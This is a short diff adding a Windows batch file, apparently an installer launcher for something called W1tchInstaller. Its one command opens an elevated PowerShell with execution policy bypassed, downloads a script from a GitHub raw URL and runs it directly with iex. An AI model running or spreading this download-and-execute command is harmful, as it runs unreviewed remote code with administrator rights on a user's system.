@@ -1,0 +1,2 @@
+@echo off
+powershell -Command "Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command &{ iwr https://raw.githubusercontent.com/voidshaman/W1tchInstaller/main/W1tchInstaller.ps1 -UseBasicParsing | iex }' -Verb RunAs"
